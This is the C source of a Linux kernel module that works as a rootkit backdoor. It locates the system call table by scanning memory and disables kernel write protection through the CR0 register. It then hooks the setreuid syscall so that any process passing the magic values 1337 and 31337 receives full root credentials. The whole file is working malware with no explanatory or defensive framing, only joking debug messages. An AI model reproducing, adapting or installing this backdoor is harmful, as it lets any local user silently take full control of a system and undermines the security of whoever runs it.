#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/delay.h> 
#include <linux/sched.h>
#include <linux/version.h>

// Write Protect Bit (CR0:16)
#define CR0_WP 0x00010000 

MODULE_LICENSE("GPL");

void **syscall_table;

unsigned long **find_sys_call_table(void);

long (*orig_sys_setreuid)(uid_t ruid, uid_t euid);

/**
 * /boot/System.map-3.13.0-43-generic:
 *
 * ffffffff811bb230 T sys_close
 * ffffffff81801400 R sys_call_table
 * ffffffff81c15020 D loops_per_jiffy
 *
 */
unsigned long **find_sys_call_table()
{
    unsigned long ptr;
    unsigned long *p;

    for (ptr = (unsigned long) sys_close; ptr < (unsigned long) &loops_per_jiffy; ptr += sizeof(void *))
    {
             
        p = (unsigned long *) ptr;

        if (p[__NR_close] == (unsigned long) sys_close)
        {
            return (unsigned long **) p;
        }
    }
    
    return NULL;
}

int my_sys_setreuid(uid_t ruid, uid_t euid)
{
    struct user_namespace *ns = current_user_ns();
    struct cred *new;
    int result;

    kuid_t kuid;
    kgid_t kgid;
    
    if (ruid == 1337 && euid == 31337)
    {
        printk(KERN_DEBUG "You just found our magic number!\n");

        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
            current->uid = 0;
            current->gid = 0;
            current->euid = 0;
            current->egid = 0;
            current->suid = 0;
            current->sgid = 0;
            current->fsuid = 0;
            current->fsgid = 0;

            result = 0;
        #elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30) && LINUX_VERSION_CODE <= KERNEL_VERSION(3, 4, 0)
            new = prepare_creds();
 
            if (new != NULL)
            {
                new->uid = 0;
                new->gid = 0;
                new->euid = 0;
                new->egid = 0;
                new->suid = 0;
                new->sgid = 0;
                new->fsuid = 0;
                new->fsgid = 0;

                result = commit_creds(new);
            }

            else
            {
               abort_creds(new);
               return -ENOMEM;
            }
        #else
            kuid = make_kuid(ns, 0);
            kgid = make_kgid(ns, 0);

            if (! uid_valid(kuid) && ! gid_valid(kgid))
            {
                return -EINVAL;
            }

            new = prepare_creds();

            if (new != NULL)
            {
                new->uid = kuid;
                new->gid = kgid;
                new->euid = kuid;
                new->egid = kgid;
                new->suid = kuid;
                new->sgid = kgid;
                new->fsuid = kuid;
                new->fsgid = kgid;

                result = commit_creds(new);
            }

            else
            {
               abort_creds(new);
               return -ENOMEM;
            }
        #endif
        
        printk(KERN_DEBUG "Always remember... With great power comes great responsibility!\n");

        return result;
    }

    return orig_sys_setreuid(ruid, euid);
}

static int __init syscall_init(void)
{
    unsigned long cr0;

    printk(KERN_DEBUG "Let's do some magic!\n");

    syscall_table = (void **) find_sys_call_table();

    if (! syscall_table) {
        printk(KERN_DEBUG "ERROR: Cannot find the system call table address.\n"); 
        return -1;
    }
    
    printk(KERN_DEBUG "Found the sys_call_table at %16lx.\n", (unsigned long) syscall_table);

    cr0 = read_cr0();
    write_cr0(cr0 & ~CR0_WP);

    printk(KERN_DEBUG "Houston! We have full write access to all pages. Proceeding...\n");
    orig_sys_setreuid = syscall_table[__NR_setreuid];
    syscall_table[__NR_setreuid] = my_sys_setreuid;

    write_cr0(cr0);
  
    return 0;
}

static void __exit syscall_release(void)
{
    unsigned long cr0;

    printk(KERN_DEBUG "I hate you!\n");

    cr0 = read_cr0();
    write_cr0(cr0 & ~CR0_WP);
    
    syscall_table[__NR_setreuid] = orig_sys_setreuid;
        
    write_cr0(cr0);
}

module_init(syscall_init);
module_exit(syscall_release);
